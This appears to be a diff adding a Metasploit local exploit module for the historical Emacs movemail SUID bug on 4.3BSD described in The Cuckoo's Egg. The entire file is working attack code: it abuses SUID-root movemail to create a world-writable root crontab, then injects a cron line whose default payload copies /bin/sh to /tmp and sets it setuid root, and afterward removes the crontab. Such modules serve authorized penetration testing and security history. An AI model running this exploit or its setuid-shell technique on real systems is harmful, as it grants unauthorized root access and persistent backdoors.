@@ -1,0 +1,163 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Local
+
+  Rank = ExcellentRanking
+
+  include Msf::Post::File
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Emacs movemail Privilege Escalation',
+      'Description'    => %q{
+        This module exploits a SUID installation of the Emacs movemail utility
+        to run a command as root by writing to 4.3BSD's /usr/lib/crontab.local.
+        The vulnerability is documented in Cliff Stoll's book The Cuckoo's Egg.
+      },
+      'Author'         => [
+        'Markus Hess', # Discovery? atrun(8) exploit for sure
+        'Cliff Stoll', # The Cuckoo's Egg hacker tracker
+        'wvu'          # Module and additional research
+      ],
+      'References'     => [
+        %w[URL https://en.wikipedia.org/wiki/Movemail],
+        %w[URL https://en.wikipedia.org/wiki/The_Cuckoo%27s_Egg],
+        %w[URL http://pdf.textfiles.com/academics/wilyhacker.pdf],
+        %w[URL https://www.gnu.org/software/emacs/manual/html_node/efaq/Security-risks-with-Emacs.html],
+        %w[URL https://www.gnu.org/software/emacs/manual/html_node/emacs/Movemail.html],
+        %w[URL https://mailutils.org/manual/html_node/movemail.html]
+      ],
+      'DisclosureDate' => '1986-08-01', # Day unknown, assuming first of month
+      'License'        => MSF_LICENSE,
+      'Platform'       => 'unix',
+      'Arch'           => ARCH_CMD,
+      'SessionTypes'   => %w[shell],
+      'Privileged'     => true,
+      'Payload'        => {'BadChars' => "\n", 'Encoder' => 'generic/none'},
+      'Targets'        => [['/usr/lib/crontab.local', {}]],
+      'DefaultTarget'  => 0,
+      'DefaultOptions' => {
+        'PAYLOAD'      => 'cmd/unix/generic',
+        'CMD'          => 'cp /bin/sh /tmp && chmod u+s /tmp/sh'
+      }
+    ))
+
+    register_options([
+      OptString.new('MOVEMAIL', [true, 'Path to movemail', '/etc/movemail'])
+    ])
+
+    register_advanced_options([
+      OptBool.new('ForceExploit', [false, 'Override check result', false])
+    ])
+  end
+
+  def bin_path
+    '/bin:/usr/bin:/usr/ucb:/etc'
+  end
+
+  def movemail
+    datastore['MOVEMAIL']
+  end
+
+  def crontab_local
+    '/usr/lib/crontab.local'
+  end
+
+  def crontab(cmd)
+    "* * * * * root #{cmd}\n* * * * * root rm -f #{crontab_local}"
+  end
+
+  # uname(1) does not exist, technique from /etc/rc.local
+  def is_43bsd?
+    cmd_exec('strings /vmunix | grep UNIX').include?('4.3 BSD')
+  end
+
+  # id(1) does not exist
+  def is_root?
+    cmd_exec('whoami').include?('root')
+  end
+
+  # test -u does not exist
+  def setuid_root?(path)
+    cmd_exec("find #{path} -user root -perm -4000 -print").include?(path)
+  end
+
+  def setup
+    super
+
+    vprint_status("Setting a sane $PATH: #{bin_path}")
+
+    case cmd_exec('echo $SHELL')
+    when %r{/bin/sh}
+      vprint_status('Current shell is /bin/sh')
+      cmd_exec("PATH=#{bin_path}; export PATH")
+    when %r{/bin/csh}
+      vprint_status('Current shell is /bin/csh')
+      cmd_exec("setenv PATH #{bin_path}")
+    else
+      vprint_bad('Current shell is unknown')
+    end
+
+    vprint_status("$PATH is #{cmd_exec('echo $PATH').chomp}")
+  end
+
+  def check
+    unless is_43bsd?
+      vprint_warning('System does not appear to be 4.3BSD')
+    end
+
+    unless file?(movemail)
+      vprint_bad("#{movemail} not found")
+      return CheckCode::Safe
+    end
+
+    unless movemail.end_with?('movemail')
+      vprint_warning("#{movemail} has an unexpected name")
+    end
+
+    unless setuid_root?(movemail)
+      vprint_status("Non-SUID-root #{movemail} found")
+      return CheckCode::Detected
+    end
+
+    vprint_good("SUID-root #{movemail} found")
+    CheckCode::Appears
+  end
+
+  def exploit
+    if is_root?
+      print_good('Session is already root, executing payload directly')
+      return cmd_exec(payload.encoded)
+    end
+
+    unless check == CheckCode::Appears || datastore['ForceExploit']
+      fail_with(Failure::NotVulnerable, 'Set ForceExploit to override')
+    end
+
+    # outdesc = open (outname, O_WRONLY | O_CREAT | O_EXCL, 0666);
+    if file?(crontab_local)
+      fail_with(Failure::NoTarget, "#{crontab_local} already exists")
+    end
+
+    print_status('Preparing crontab with payload')
+    tab = crontab(payload.encoded)
+    vprint_line(tab)
+
+    # umask (umask (0) & 0333);
+    # (void) ftruncate (indesc, 0L);
+    print_status("Creating writable #{crontab_local}")
+    cmd_exec("(umask 0 && #{movemail} /dev/null #{crontab_local})")
+
+    unless writable?(crontab_local)
+      fail_with(Failure::NoAccess, "#{crontab_local} is not writable")
+    end
+
+    print_good("Writing crontab to #{crontab_local}")
+    cmd_exec("echo '#{tab.gsub("'", "'\\\\''")}' > #{crontab_local}")
+    print_warning('Please wait at least one minute for effect')
+  end
+
+end
